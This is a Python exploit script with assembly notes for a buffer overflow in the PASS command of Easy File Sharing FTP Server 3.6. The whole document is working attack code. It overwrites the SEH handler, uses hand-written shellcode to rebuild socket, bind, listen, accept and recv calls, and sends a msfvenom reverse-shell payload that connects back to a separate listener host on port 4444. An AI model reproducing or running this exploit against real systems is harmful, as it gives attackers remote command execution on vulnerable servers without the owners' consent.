'''exploit : Easy File Sharing FTP Server 3.6 FTP PASS command buffer overflow using socket reconstruction.
Exploit Creation creds : Goutham Madhwaraj ( @barriersec.com)
tested on : windows xp sp3 (x86) .

technique credits : OJ

'''

'''

required syscalls :


0045629E  -FF25 9CE74700    JMP DWORD PTR DS:[<&.#23>]        ; WS2_32.socket
004562A4  -FF25 A0E74700    JMP DWORD PTR DS:[<&WSOCK32.#2>]         ; WS2_32.bind
00456286  -FF25 8CE74700    JMP DWORD PTR DS:[<&WSOCK32.#13>]        ; WS2_32.listen
004562F8  -FF25 48E74700    JMP DWORD PTR DS:[<&WSOCK32.#1>]         ; WS2_32.accept
00456274  -FF25 80E74700    JMP DWORD PTR DS:[<&WSOCK32.#16>]        ; WSOCK32.recv

-----------------------------------------------------------------------------------
socket : socket(2, 1, 6)

"\xB0\x06\x50\xB0\x01\x50\x40\x50\xBB\x77\x9E\x62\x45\xC1\xEB\x08\xFF\xD3" ( 18 bytes )

00C6ADED   B0 06            MOV AL,6
00C6ADEF   50               PUSH EAX
00C6ADF0   B0 01            MOV AL,1
00C6ADF2   50               PUSH EAX
00C6ADF3   40               INC EAX
00C6ADF4   50               PUSH EAX
00C6ADF5   BB 779E6245      MOV EBX,45629E77
00C6ADFA   C1EB 08          SHR EBX,8
00C6ADFD   FFD3             CALL EBX


------------------------------------------------------------------------------------

bind : bind(socket handle,socket addr struct,10)

stack at bind call : ( to get socket address )

00124F44   00475237  /CALL to bind from fsfs.00475232
00124F48   00000158  |Socket = 158
00124F4C   00124F58  |pSockAddr = 00124F58
00124F50   00000010   \AddrLen = 10 (16.)

--------

at sock addr : we can find socket structure :

00124F57   0002             ADD BYTE PTR DS:[EDX],AL
00124F59   0000             ADD BYTE PTR DS:[EAX],AL
00124F5B   15 00000000      ADC EAX,0

out of which 00124F58 is the pointer to it and , + 3 bytes gives us the port 21 ( 0x15) we can increment to our required binding port .

"\x83\xEc\x28\x8B\xF8\x83\xEC\x50\x54\x59\xC6\x01\x02\xC6\x41\x03\x16\x6A\x10\x51\xB3\xA4\x57\xFF\xD3"

013EADFE   83EC 28          SUB ESP,28
013EAE01   8BF8             MOV EDI,EAX
013EAE03   83EC 50          SUB ESP,50
013EAE06   54               PUSH ESP
013EAE07   59               POP ECX
013EAE08   C601 02          MOV BYTE PTR DS:[ECX],2
013EAE0B   C641 03 16       MOV BYTE PTR DS:[ECX+3],16
013EAE0F   6A 10            PUSH 10
013EAE11   51               PUSH ECX
013EAE12   B3 A4            MOV BL,0A4
013EAE14   57               PUSH EDI
013EAE15   FFD3             CALL EBX

------------------------------------------------------------------------------------

Listen :

"\x66\xBB\x86\x62\x6A\x7F\x57\xFF\xD3"

00C6AE18   66:BB 8662       MOV BX,6286
00C6AE1C   6A 7F            PUSH 7F
00C6AE1E   57               PUSH EDI
00C6AE1F   FFD3             CALL EBX

------------------------------------------------------------------------------------
accept : accept(socket, NULL, NULL)

"\x33\xC0\x50\x50\x66\xBB\xF8\x62\x57\xFF\xD3"


00C6AE21   33C0             XOR EAX,EAX
00C6AE23   50               PUSH EAX
00C6AE24   50               PUSH EAX
00C6AE25   66:BB F862       MOV BX,62F8
	   57               PUSH EDI
	   FFD3             CALL EBX

------------------------------------------------------------------------------------

recv :

"\x8B\xF8\x33\xC0\x50\xB4\x02\x50\x54\x59\x66\x81\xC1\xD8\x0F\xB3\x74\x51\x57\xFF\xD3"

013EAE18   8BF8             MOV EDI,EAX
		
013EAE1A   33C0             XOR EAX,EAX
		50		PUSH EAX
013EAE1C   B4 02            MOV AH,2
013EAE1E   50               PUSH EAX
013EAE1F   54               PUSH ESP
013EAE20   59               POP ECX
013EAE21   66:81C1 D80F     ADD CX,0FD8
013EAE26   B3 74            MOV BL,74
           51               push ECX
		57	    push EDI
013EAE28   FFD3             CALL EBX





'''



import socket
import sys
from time import sleep

host = "192.168.0.102"
port = 21


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "[+]connecting to host..."
	con.connect((host,port))
	print con.recv(1024)
except:
	print "could not connect to the host"



user = "USER anonymous"+"\r\n"
con.send(user)
print con.recv(1024)

#pop pop ret 10017F21 SSLEAY32.dll
seh = "\x21\x7F\x01\x10"

#forward jump + 22 bytes
nseh = "\xEB\x14\x90\x90"

socket_call = "\xB0\x06\x50\xB0\x01\x50\x40\x50\xBB\x77\x9E\x62\x45\xC1\xEB\x08\xFF\xD3"

bind_call = "\x83\xEc\x28\x8B\xF8\x83\xEC\x50\x54\x59\xC6\x01\x02\xC6\x41\x03\x16\x6A\x10\x51\xB3\xA4\x57\xFF\xD3"

listen_call = "\x66\xBB\x86\x62\x6A\x7F\x57\xFF\xD3"

accept_call = "\x33\xC0\x50\x50\x66\xBB\xF8\x62\x57\xFF\xD3"

recv_call = "\x8B\xF8\x33\xC0\x50\xB4\x02\x50\x54\x59\x66\x81\xC1\xD8\x0F\xB3\x74\x51\x57\xFF\xD3"


#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c

rev_shell = (

"\xb8\xd4\x48\x2c\x12\xd9\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\x97\x46\xce\xe7\xeb\xbf\x8c"
"\x08\x13\x40\xf1\x81\xf6\x71\x31\xf5\x73\x21\x81\x7d\xd1\xce"
"\x6a\xd3\xc1\x45\x1e\xfc\xe6\xee\x95\xda\xc9\xef\x86\x1f\x48"
"\x6c\xd5\x73\xaa\x4d\x16\x86\xab\x8a\x4b\x6b\xf9\x43\x07\xde"
"\xed\xe0\x5d\xe3\x86\xbb\x70\x63\x7b\x0b\x72\x42\x2a\x07\x2d"
"\x44\xcd\xc4\x45\xcd\xd5\x09\x63\x87\x6e\xf9\x1f\x16\xa6\x33"
"\xdf\xb5\x87\xfb\x12\xc7\xc0\x3c\xcd\xb2\x38\x3f\x70\xc5\xff"
"\x3d\xae\x40\x1b\xe5\x25\xf2\xc7\x17\xe9\x65\x8c\x14\x46\xe1"
"\xca\x38\x59\x26\x61\x44\xd2\xc9\xa5\xcc\xa0\xed\x61\x94\x73"
"\x8f\x30\x70\xd5\xb0\x22\xdb\x8a\x14\x29\xf6\xdf\x24\x70\x9f"
"\x2c\x05\x8a\x5f\x3b\x1e\xf9\x6d\xe4\xb4\x95\xdd\x6d\x13\x62"
"\x21\x44\xe3\xfc\xdc\x67\x14\xd5\x1a\x33\x44\x4d\x8a\x3c\x0f"
"\x8d\x33\xe9\x80\xdd\x9b\x42\x61\x8d\x5b\x33\x09\xc7\x53\x6c"
"\x29\xe8\xb9\x05\xc0\x13\x2a\xea\xbd\x1b\xc2\x82\xbf\x1b\x03"
"\x0f\x49\xfd\x49\xbf\x1f\x56\xe6\x26\x3a\x2c\x97\xa7\x90\x49"
"\x97\x2c\x17\xae\x56\xc5\x52\xbc\x0f\x25\x29\x9e\x86\x3a\x87"
"\xb6\x45\xa8\x4c\x46\x03\xd1\xda\x11\x44\x27\x13\xf7\x78\x1e"
"\x8d\xe5\x80\xc6\xf6\xad\x5e\x3b\xf8\x2c\x12\x07\xde\x3e\xea"
"\x88\x5a\x6a\xa2\xde\x34\xc4\x04\x89\xf6\xbe\xde\x66\x51\x56"
"\xa6\x44\x62\x20\xa7\x80\x14\xcc\x16\x7d\x61\xf3\x97\xe9\x65"
"\x8c\xc5\x89\x8a\x47\x4e\xa9\x68\x4d\xbb\x42\x35\x04\x06\x0f"
"\xc6\xf3\x45\x36\x45\xf1\x35\xcd\x55\x70\x33\x89\xd1\x69\x49"
"\x82\xb7\x8d\xfe\xa3\x9d"



)


final_payload = "\x90"*30 + rev_shell

crash ="PASS " + "\x2c" + "A"*2559 + nseh + seh + "\x90"*20 +socket_call + bind_call +listen_call+accept_call+recv_call + "\x90"*(351 - len(socket_call)-len(bind_call)-len(listen_call)-len(accept_call)-len(recv_call))+ "E"*(4008-8-2559-25-351) + "\r\n"



print "[+] sending payload in password command...\n"
#sending exploit
con.send(crash)

print "sleeping for two seconds..."

print "connecting to bind socket on port 22.."
sleep(2)
con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect((host,port+1))
print "sending final payload ! set your netcat listener!"
con.send(final_payload)
con.close()
